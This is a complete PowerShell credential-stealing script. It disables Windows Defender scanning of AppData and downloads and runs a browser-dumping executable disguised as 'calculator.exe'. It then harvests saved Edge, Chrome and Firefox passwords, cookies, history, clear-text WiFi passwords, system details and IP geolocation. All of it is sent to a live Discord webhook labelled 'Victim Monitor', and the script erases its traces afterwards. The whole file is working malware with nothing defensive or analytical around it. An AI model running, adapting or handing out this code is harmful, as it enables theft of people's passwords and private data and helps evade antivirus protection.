# Add Windows Defender exclusion
Add-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue

# Create working directory
mkdir "$env:appdata\Microsoft\dump" -Force
Set-Location "$env:appdata\Microsoft\dump"

# Download and run HackBrowser
try {
    Invoke-WebRequest 'https://raw.githubusercontent.com/tahasim/HWI/main/calculator.exe' -OutFile "hb.exe"
    .\hb.exe --format json
    Remove-Item "hb.exe" -Force
} catch {
    cd "$env:appdata"
    Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse -ErrorAction SilentlyContinue
    exit
}

# ============================================
# GATHER EXTENSIVE VICTIM INFORMATION
# ============================================

# Network Info
$ip = try { (Invoke-RestMethod "http://ifconfig.me/ip").Trim() } catch { "Unknown" }
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress | Select-Object -First 1

# System Info
$username = $env:USERNAME
$computer = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$osVersion = (Get-CimInstance Win32_OperatingSystem).Version
$architecture = (Get-CimInstance Win32_OperatingSystem).OSArchitecture

# Hardware Info
$cpu = (Get-CimInstance Win32_Processor).Name
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController).Name | Select-Object -First 1
$manufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
$model = (Get-CimInstance Win32_ComputerSystem).Model

# Disk Info
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
$diskSize = [math]::Round($disk.Size / 1GB, 2)
$diskFree = [math]::Round($disk.FreeSpace / 1GB, 2)
$diskUsed = $diskSize - $diskFree

# Location Info (IP-based geolocation)
try {
    $geoData = Invoke-RestMethod "http://ip-api.com/json/$ip"
    $country = $geoData.country
    $city = $geoData.city
    $isp = $geoData.isp
    $timezone = $geoData.timezone
    $latitude = $geoData.lat
    $longitude = $geoData.lon
} catch {
    $country = "Unknown"
    $city = "Unknown"
    $isp = "Unknown"
    $timezone = "Unknown"
}

# WiFi Networks
$wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
$wifiCount = $wifiProfiles.Count

# Antivirus Info
$avProduct = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
$avName = if ($avProduct) { $avProduct.displayName } else { "Windows Defender" }

# Screen Resolution
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$screenRes = "$($screen.Width)x$($screen.Height)"

# Installed Software Count
$softwareCount = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object DisplayName).Count

# Uptime
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeFormatted = "{0} days, {1} hours" -f $uptime.Days, $uptime.Hours

# Discord webhook
$webhook = "https://discord.com/api/webhooks/1480287085771620606/WtlPfAW2q0H_-PmPD8AG6axb7k_iHbzmkg46kiomUxskavkfn7yCXoKaP_VtssBE0mJ9"

# ============================================
# PARSE BROWSER DATA
# ============================================

if (Test-Path "results") {
    cd results
} else {
    cd "$env:appdata"
    Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse -ErrorAction SilentlyContinue
    exit
}

$formattedCreds = ""
$passwordCount = 0
$cookieCount = 0
$historyCount = 0

# Check Edge passwords
if (Test-Path "microsoft_edge_password.json") {
    $edgePass = Get-Content "microsoft_edge_password.json" | ConvertFrom-Json
    foreach ($cred in $edgePass) {
        $formattedCreds += "🔷 **Edge** | ``$($cred.url)```n"
        $formattedCreds += "   👤 ``$($cred.username)`` | 🔑 ``$($cred.password)```n`n"
        $passwordCount++
    }
}

# Check Chrome passwords
if (Test-Path "chrome_password.json") {
    $chromePass = Get-Content "chrome_password.json" | ConvertFrom-Json
    foreach ($cred in $chromePass) {
        $formattedCreds += "🔵 **Chrome** | ``$($cred.url)```n"
        $formattedCreds += "   👤 ``$($cred.username)`` | 🔑 ``$($cred.password)```n`n"
        $passwordCount++
    }
}

# Check Firefox passwords
if (Test-Path "firefox_password.json") {
    $ffPass = Get-Content "firefox_password.json" | ConvertFrom-Json
    foreach ($cred in $ffPass) {
        $formattedCreds += "🦊 **Firefox** | ``$($cred.url)```n"
        $formattedCreds += "   👤 ``$($cred.username)`` | 🔑 ``$($cred.password)```n`n"
        $passwordCount++
    }
}

# Limit credentials display (Discord has 4096 char limit per field)
if ($formattedCreds.Length -gt 1000) {
    $formattedCreds = $formattedCreds.Substring(0, 1000) + "`n`n... *and more (see raw data below)*"
}

if ($passwordCount -eq 0) {
    $formattedCreds = "⚠️ No saved passwords found"
}

# Count cookies
$cookieFiles = Get-ChildItem -Filter "*cookie*.json"
foreach ($file in $cookieFiles) {
    $cookies = Get-Content $file.FullName | ConvertFrom-Json
    $cookieCount += $cookies.Count
}

# Count history
if (Test-Path "microsoft_edge_history.json") {
    $history = Get-Content "microsoft_edge_history.json" | ConvertFrom-Json
    $historyCount += $history.Count
}
if (Test-Path "chrome_history.json") {
    $history = Get-Content "chrome_history.json" | ConvertFrom-Json
    $historyCount += $history.Count
}

# ============================================
# CREATE BEAUTIFUL DISCORD EMBED
# ============================================

$payload = @{
    username = "Victim Monitor"
    avatar_url = "https://i.imgur.com/4M34hi2.png"
    embeds = @(
        @{
            author = @{
                name = "🚨 NEW SYSTEM COMPROMISED"
                icon_url = "https://i.imgur.com/4M34hi2.png"
            }
            title = "**$username@$computer**"
            color = 15158332
            thumbnail = @{
                url = "https://flagcdn.com/w80/$($country.ToLower().Substring(0,2)).png"
            }
            fields = @(
                @{
                    name = "🌍 Location"
                    value = "**Country:** $country`n**City:** $city`n**ISP:** $isp`n**Timezone:** $timezone"
                    inline = $true
                }
                @{
                    name = "🌐 Network"
                    value = "**Public IP:** ``$ip```n**Local IP:** ``$localIP```n**WiFi Networks:** $wifiCount saved"
                    inline = $true
                }
                @{
                    name = "💻 System"
                    value = "**OS:** $os`n**Version:** $osVersion`n**Architecture:** $architecture"
                    inline = $false
                }
                @{
                    name = "⚙️ Hardware"
                    value = "**CPU:** $cpu`n**RAM:** ${ram}GB`n**GPU:** $gpu"
                    inline = $true
                }
                @{
                    name = "💾 Storage"
                    value = "**Total:** ${diskSize}GB`n**Used:** ${diskUsed}GB`n**Free:** ${diskFree}GB"
                    inline = $true
                }
                @{
                    name = "📊 Additional Info"
                    value = "**Model:** $manufacturer $model`n**Screen:** $screenRes`n**Antivirus:** $avName`n**Uptime:** $uptimeFormatted`n**Software:** $softwareCount apps"
                    inline = $false
                }
                @{
                    name = "📈 Data Summary"
                    value = "🔑 **$passwordCount** Passwords`n🍪 **$cookieCount** Cookies`n📜 **$historyCount** History Items"
                    inline = $false
                }
            )
            footer = @{
                text = "Exfiltrated on $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') UTC"
            }
            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
        }
    )
}

if ($passwordCount -gt 0) {
    $payload.embeds += @{
        title = "🔐 Stolen Credentials"
        description = $formattedCreds
        color = 16776960
    }
}

$jsonPayload = $payload | ConvertTo-Json -Depth 10
Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonPayload -ContentType 'application/json; charset=utf-8'

# ============================================
# SEND RAW DATA FILES
# ============================================

Start-Sleep -Seconds 2

$files = Get-ChildItem -Filter "*.json"
foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    if ($content.Length -gt 10 -and $content.Length -lt 1800) {
        $msg = @{
            content = "**📎 $($file.Name)**``````json`n$content``````"
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Seconds 1
    }
}

# ============================================
# SEND ADDITIONAL SYSTEM DATA
# ============================================

Start-Sleep -Seconds 2

# WiFi Passwords
$wifiData = ""
foreach ($profile in $wifiProfiles | Select-Object -First 10) {
    $wifiInfo = netsh wlan show profile name="$profile" key=clear
    $ssid = $profile
    $password = ($wifiInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
    if ($password) {
        $wifiData += "📶 **$ssid** → ``$password```n"
    }
}

if ($wifiData) {
    $wifiPayload = @{
        embeds = @(
            @{
                title = "📶 WiFi Passwords"
                description = $wifiData
                color = 3447003
            }
        )
    } | ConvertTo-Json -Depth 10
    
    Invoke-RestMethod -Uri $webhook -Method Post -Body $wifiPayload -ContentType 'application/json; charset=utf-8'
}

# ============================================
# CLEANUP
# ============================================

cd "$env:appdata"
Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue